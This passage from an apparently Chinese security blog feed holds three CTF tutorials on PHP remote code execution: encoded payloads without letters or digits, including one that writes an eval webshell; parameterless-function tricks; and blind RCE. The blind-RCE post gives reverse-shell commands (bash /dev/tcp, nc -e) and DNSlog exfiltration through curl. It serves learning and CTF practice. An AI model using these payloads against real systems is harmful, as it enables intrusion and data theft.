alt="image.png"></p><h3 id="例子1："><a href="#例子1：" class="headerlink" title="例子1："></a>例子1：</h3><p>在php7中，因为可以使用($a)()这种方法来执行命令，所以说我们利用<code>call_user_func()</code>来举例，<code>(call_user_func)(system,whoami,&#39;&#39;)</code>即可执行<code>whoami</code>的命令：</p><p><img src="https://i.loli.net/2021/07/28/MJiaehA9p1HUrKD.png" alt="image.png"></p><p>那构造出来的结果就为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&#x27;&#x27;);</span><br></pre></td></tr></table></figure><h3 id="例子2："><a href="#例子2：" class="headerlink" title="例子2："></a>例子2：</h3><p>再来一个在php7中利用<code>file_put_contents()</code>写入<code>shell</code>的例子：</p><p><img src="https://i.loli.net/2021/07/28/ZLgrdRDoOp1Kjsv.png" alt="image.png"></p><p>我们要构造的语句为：<code>file_put_contents(&#39;4.php&#39;,&#39;&lt;?php eval(\$_POST[1]);&#39;);</code>构造出来就为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~(%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C))(~(%CB%D1%8F%97%8F),~(%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));</span><br></pre></td></tr></table></figure><p>这里要注意的就是要有该目录的写入权限哈</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/8107">https://xz.aliyun.com/t/8107</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://blog.csdn.net/weixin_46330722/article/details/112898103?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_46330722/article/details/112898103?spm=1001.2014.3001.5501</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;无数字字母rce&quot;&gt;&lt;a href=&quot;#无数字字母rce&quot; class=&quot;headerlink&quot; title=&quot;无数字字母rce&quot;&gt;&lt;/a&gt;无数字字母rce&lt;/h1&gt;&lt;p&gt;无数字字母rce，这是一个老生常谈的问题了，就是不利用数字和字母构造出&lt;code&gt;webshell&lt;/code&gt;，从而能够执行我们的命令，之前一直没有系统总结过，今天来好好总结总结，这里主要是总结异或和取反两种方法，这两种方法是目前来看最实用的两种方法，还有一种自增的方法稍微介绍一下就好&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>RCE篇之无参数rce</title>
    <link href="https://arsenetang.github.io/2021/07/26/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%8F%82%E6%95%B0rce/"/>
    <id>https://arsenetang.github.io/2021/07/26/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%8F%82%E6%95%B0rce/</id>
    <published>2021-07-26T15:34:11.550Z</published>
    <updated>2021-07-26T15:33:52.428Z</updated>
    
    <content type="html"><![CDATA[<h1 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h1><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p><span id="more"></span><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/26/GMZb7DrRScECIlN.png" alt="image.png"></p><p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b(&#39;111&#39;));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。那假如遇到这种情况，我们就只能使用没有参数的php函数，下面就来具体介绍一下：</p><h2 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h2><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/26/Lz9jT6SYD3NHb8y.png" alt="image.png"></p><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p><p><img src="https://i.loli.net/2021/07/26/BQ6T5OrMGfjlZgN.png" alt="image.png"></p><p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示：</p><p><img src="https://i.loli.net/2021/07/26/4FqvBfXaAeyNC3g.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/3ZBCwRhXz2ak7YM.png" alt="image.png"></p><h2 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars()"></a>2.get_defined_vars()</h2><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p><p><img src="https://i.loli.net/2021/07/26/13JpeDs8nRGUczk.png" alt="image.png"></p><p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p><p><img src="https://i.loli.net/2021/07/26/PxMQULHXu9aiYzs.png" alt="image.png"></p><p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了：</p><p><img src="https://i.loli.net/2021/07/26/Sqhg1Zj8HNx5wUW.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/smIJOtgU6pKfZkQ.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/6gGDNvxdCILqe2y.png" alt="image.png"></p><p>总结一下，这种方法和第一种方法几乎是一样的，就多了一步，就是利用<code>current()</code>函数将二维数组转换为一维数组，如果大家还是不了解<code>current()</code>函数的用法，可以接着往下看文章，会具体介绍的哦</p><p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><h2 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3.session_id()"></a>3.session_id()</h2><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p><p><img src="https://i.loli.net/2021/07/26/IoHD3R28sYNXvez.png" alt="image.png"></p><p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p><p><img src="https://i.loli.net/2021/07/26/MSZjiERGkQodUlf.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/GeOmatAkENCJwKi.png" alt="image.png"></p><p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p><p><img src="https://i.loli.net/2021/07/26/ani19egmLZcu2vH.png" alt="image.png"></p><p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦</p><h2 id="4-php函数直接读取文件"><a href="#4-php函数直接读取文件" class="headerlink" title="4.php函数直接读取文件"></a>4.php函数直接读取文件</h2><p>上面我们一直在想办法在进行rce，但有的情况下确实无法进行rce时，我们就要想办法直接利用php函数完成对目录以及文件的操作，   接下来我们就来介绍这些函数：</p><h3 id="1-localeconv"><a href="#1-localeconv" class="headerlink" title="1.localeconv"></a>1.localeconv</h3><p>官方解释：localeconv() 函数返回一个包含本地数字及货币格式信息的数组。</p><p><img src="https://i.loli.net/2021/07/26/G1zOWvBrR3CgXmy.png" alt="image.png"></p><p>这个函数其实之前我一直搞不懂它是干什么的，为什么在这里有用，但实践出真知，我们在测试代码中将<code>localeconv()</code>的返回结果输出出来，这里很神奇的事就发生了，它返回的是一个二维数组，而它的第一位居然是一个点<code>.</code>，那按照我们上面讲的，是可以利用<code>current()</code>函数将这个点取出来的，但这个点有什么用呢？点代表的是当前目录！那就很好理解了，我们可以利用这个点完成遍历目录的操作！相当于就是<code>linux</code>中的<code>ls</code>，具体请看下图：</p><p><img src="https://i.loli.net/2021/07/26/sfonwIYeMTOi3KC.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/Yqci9fpVy3H6Pm2.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/S1cTe9vuVXbZUgp.png" alt="image.png"></p><h3 id="2-scandir"><a href="#2-scandir" class="headerlink" title="2.scandir"></a>2.scandir</h3><p>这个函数很好理解，就是列出目录中的文件和目录</p><p><img src="https://i.loli.net/2021/07/26/5waJdTMjDNoL4HW.png" alt="image.png"></p><h3 id="3-current-pos"><a href="#3-current-pos" class="headerlink" title="3.current(pos)"></a>3.current(pos)</h3><p>这里首先声明，<code>pos()</code>函数是<code>current()</code>函数的别名，他们俩是完全一样的哈</p><p>这个函数我们前面已经用的很多了，它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值，如果要移动可以用下列方法进行移动：</p><p><img src="https://i.loli.net/2021/07/26/TMYrPC3gjWAUN8K.png" alt="image.png"></p><h3 id="4-chdir"><a href="#4-chdir" class="headerlink" title="4.chdir()"></a>4.chdir()</h3><p>这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为<code>scandir()</code>会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用<code>chdir</code>切就好了，如果要向上跳就要构造<code>chdir(&#39;..&#39;)</code></p><p><img src="https://i.loli.net/2021/07/26/EbcgjxLkBCWNZvR.png" alt="image.png"></p><h3 id="5-array-reverse"><a href="#5-array-reverse" class="headerlink" title="5.array_reverse()"></a>5.array_reverse()</h3><p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个<code>next()</code></p><h3 id="6-highlight-file"><a href="#6-highlight-file" class="headerlink" title="6.highlight_file()"></a>6.highlight_file()</h3><p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p><h2 id="例题解析——–GXYCTF-2019禁止套娃"><a href="#例题解析——–GXYCTF-2019禁止套娃" class="headerlink" title="例题解析——–GXYCTF 2019禁止套娃"></a>例题解析——–GXYCTF 2019禁止套娃</h2><p>这道题首先是一个git源码泄露，我们先用<code>GitHack</code>把源码跑下来，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出它是一个有过滤的无参rce，由于它过滤掉了<code>et</code>，导致我们前两种的方法都用不了，而且它也过滤了<code>hex bin</code>，第三种方法也不能像我们上面讲的一样先16进制编码了，而且我抓包以后都看不到<code>PHPSESSID</code>的参数，估计第三种方法也用不了，但有了前面的铺垫，用第四种方法就可以很简单的解决了，首先遍历当前目录：</p><p><img src="https://i.loli.net/2021/07/26/KXMbW8facpPmti4.png" alt="image.png"></p><p>可以看到<code>flag.php</code>是倒数第二个，那我们就把它反转一下，然后再用一个<code>next()</code>就是<code>flag.php</code>这个文件了：</p><p><img src="https://i.loli.net/2021/07/26/Fw3WnoTyICteOpq.png" alt="image.png"></p><p>胜利就在眼前，直接<code>highlight_file</code>读取这个文件就拿到flag了：</p><p><img src="https://i.loli.net/2021/07/26/nqZR5luCJ3TLdvx.png" alt="image.png"></p><p>思路总结:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scandir(current(localeconv()))是查看当前目录</span><br><span class="line">加上array_reverse()是将数组反转，即<span class="keyword">Array</span>([<span class="number">0</span>]=&gt;index.php[<span class="number">1</span>]=&gt;flag.php=&gt;[<span class="number">2</span>].git[<span class="number">3</span>]=&gt;..[<span class="number">4</span>]=&gt;.)</span><br><span class="line">再加上next()表示内部指针指向数组的下一个元素，并输出，即指向flag.php</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码</span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://www.huaweicloud.com/zhishi/arc-13511436.html">https://www.huaweicloud.com/zhishi/arc-13511436.html</a></p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><p><a href="https://r1dd1er.top/2019/09/14/bytectf-%E6%97%A0%E5%8F%82RCE/">https://r1dd1er.top/2019/09/14/bytectf-%E6%97%A0%E5%8F%82RCE/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;无参数rce&quot;&gt;&lt;a href=&quot;#无参数rce&quot; class=&quot;headerlink&quot; title=&quot;无参数rce&quot;&gt;&lt;/a&gt;无参数rce&lt;/h1&gt;&lt;p&gt;无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>RCE篇之无回显rce</title>
    <link href="https://arsenetang.github.io/2021/07/23/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%9B%9E%E6%98%BErce/"/>
    <id>https://arsenetang.github.io/2021/07/23/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%9B%9E%E6%98%BErce/</id>
    <published>2021-07-23T10:08:54.293Z</published>
    <updated>2021-07-23T15:22:18.586Z</updated>
    
    <content type="html"><![CDATA[<h1 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h1><p>在ctf中，有时会遇到无回显rce，就是说虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行，借着这次总结rce的机会，就把它一起总结了</p><span id="more"></span><p>测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">exec(<span class="string">&quot;<span class="subst">$a</span>&quot;</span>);</span><br><span class="line"><span class="comment">//$b=exec(&quot;$a&quot;);</span></span><br><span class="line"><span class="comment">//echo $b;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>命令执行函数我用的是<code>exec</code>,因为这个函数本身是没有回显的，拿来做测试简直不能再合适，想了解这个函数可以看这里：<a href="https://www.php.net/manual/zh/function.exec.php">https://www.php.net/manual/zh/function.exec.php</a> 这里我们直接输入命令是没有回显的：</p><p><img src="https://i.loli.net/2021/07/23/lywFrtQzh96d8Do.png" alt="image.png"></p><p>我们首先用sleep命令看看命令是否被成功执行了，看下图它转了五秒之后才恢复说明命令是执行了的：</p><p><img src="https://i.loli.net/2021/07/21/1E8dgHADGU67kRZ.png" alt="image.png"></p><h2 id="1-反弹shell"><a href="#1-反弹shell" class="headerlink" title="1.反弹shell"></a>1.反弹shell</h2><p>遇到这种无回显的命令执行，很常见的一个思路是反弹shell，因为它虽然不会将命令执行的结果输出在屏幕上，但实际上这个命令它是执行了的，那我们就将shell反弹到自己服务器上，然后再执行命令肯定就可以看到回显了</p><p>一般来讲我们反弹shell都用的<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>这条命令，但这里我不知道哪里出了问题，在docker中可以成功反弹但放到php命令执行中就反弹不了了，所以说无奈之下我就只能使用<code>nc</code>进行反弹，但其实这是很不实用的，因为很多docker中都没有安装<code>nc</code>，这里就先演示一下用<code>nc</code>反弹，利用<code>nc -e /bin/sh ip port</code>进行反弹：</p><p><img src="https://i.loli.net/2021/07/21/5LQVt3C6miKvlRr.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/21/SEyoscMfnzgheBr.png" alt="image.png"></p><p>可以看到已经反弹成功了，拿到了根目录下的flag哈哈</p><h2 id="2-dnslog外带数据法"><a href="#2-dnslog外带数据法" class="headerlink" title="2.dnslog外带数据法"></a>2.dnslog外带数据法</h2><p>首先讲讲dns，这里用一个比较官方的解释吧，摘自百度百科：</p><p>DNS（域名解析）：</p><p>域名解析是把域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。IP地址是网络上标识站点的数字地址，为了方便记忆，采用域名来代替IP地址标识站点地址。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。</p><p>域名解析也叫域名指向、服务器设置、域名配置以及反向IP登记等等。说得简单点就是将好记的域名解析成IP，服务由DNS服务器完成，是把域名解析到一个IP地址，然后在此IP地址的主机上将一个子目录与域名绑定。</p><p>而如果我们发起请求的目标不是IP地址而是域名的话，就一定会发生一次域名解析，那么假如我们有一个可控的二级域名，那么当它向下一层域名发起解析的时候，我们就能拿到它的域名解析请求。这就相当于配合dns请求完成对命令执行的判断，这就称之为dnslog。当然，发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令哈</p><p>然后这里推荐一个dnslog的利用平台：ceye <a href="http://ceye.io/">http://ceye.io/</a>，我个人觉得挺好用的，当然大佬们也可以选择自己搭，注册账号之后，会给一个域名，当发起的请求中含有这个域名时，平台就会有记录。好了，铺垫结束，下面正式开始测试：</p><p><img src="https://i.loli.net/2021/07/23/cZLKtFx7ONgzRE3.png" alt="image.png"></p><p>还是这一段代码，我们用分号<code>;</code>作为命令的分隔符，然后发起<code>curl</code>请求，然后最后用反引号执行命令，具体如下：</p><p><img src="https://i.loli.net/2021/07/23/wtxKpbeEDFrlA8i.png" alt="image.png"></p><p>然后就可以到ceye平台上取看到我们发起的请求了，可以看到<code>whoami</code>的结果也已经在上面显示了出来：</p><p><img src="https://i.loli.net/2021/07/23/Slg8T1GwBNLEodI.png" alt="image.png"></p><p>然后我们就尝试执行其它的命令比如像<code>ls</code>之类的，但这里需要注意的一点是，如果我们直接执行<code>ls</code>的话，它只会返回第一条结果,具体如下图所示：</p><p><img src="https://i.loli.net/2021/07/23/Wj2KMsni3t7NZTf.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/Bs7ac6tLJ2MAQPW.png" alt="image.png"></p><p>那么为了让它显示出剩余的结果，我们就需要用到linux的<code>sed</code>命令，用<code>sed</code>命令就可以实现对行的完美划分，这里利用题目不是很好演示，我就直接用kali进行演示，就像下图一样直接用就行，还是很方便的：</p><p><img src="https://i.loli.net/2021/07/23/uEemFwbCSNnMWIt.png" alt="image.png"></p><p>这样就可以完成任意的命令执行了，但是值得注意的是，因为有的字符可能会无法显示或者只显示部分信息，所以说执行命令的时候推荐使用base64编码，然后再解开就好：</p><p><img src="https://i.loli.net/2021/07/23/MLnz7wrlu8GYcDN.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/hRgX1KBHMy4IVN8.png" alt="image.png"></p><h2 id="例题解析——-BJDCTF-2nd-duangShell"><a href="#例题解析——-BJDCTF-2nd-duangShell" class="headerlink" title="例题解析——-BJDCTF 2nd  duangShell"></a>例题解析——-BJDCTF 2nd  duangShell</h2><p>这道题buuctf上可以复现，先用kali恢复swp文件，然后得到源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&#x27;girl_friend&#x27;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&#x27;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl = $_POST[&#x27;girl_friend&#x27;];</span><br><span class="line">    if (preg_match(&#x27;/\&gt;|\\\/&#x27;, $girl)) &#123;</span><br><span class="line">        die(&#x27;just girl&#x27;);</span><br><span class="line">    &#125; else if (preg_match(&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;, $girl)) &#123;</span><br><span class="line">        echo &quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这就是一个有过滤情况下的无回显rce，虽然是看起来过滤的比较多，基本思路是反弹shell，但这个靶机在内网操作起来可能有点麻烦，而且像一些重要的比如<code>curl</code> <code>反引号</code>都没有被过滤掉，所以说我想尝试直接把数据外带出来，先尝试<code>whoami</code>发现没问题：</p><p><img src="https://i.loli.net/2021/07/23/7ZbL8wf4FWyBxiO.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/OiImJHZfDtXvb36.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/pzi3xtIkQTHaKWO.png" alt="image.png"></p><p>那就说明除了上面那些被禁的函数以外，可以执行任何命令，不过禁了ls是真的烦，然后由于它禁了<code>$</code>，上篇文章中讲到的找flag的语句<code>cat $(find / -name flag*)</code>就用不了了，我先盲猜一下它在根目录下名字叫flag，试试行不行，<code>cat</code>被过滤掉了我就直接用<code>tac</code>，这个问题不大，发现还真有这个文件：</p><p><img src="https://i.loli.net/2021/07/23/fnYz1eG9ruybBgH.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/SXUqyKCbiTQ3BYc.png" alt="image.png"></p><p>只不过嘛，这个内容就很狗，还要让自己去找flag，那我就试试用<code>find</code>去找，说实话这时候我心里也没底，只能说试试，用的这条语句<code> find / -name flag</code>：</p><p><img src="https://i.loli.net/2021/07/23/b3QMaRul85r1ckZ.png" alt="image.png"></p><p><img 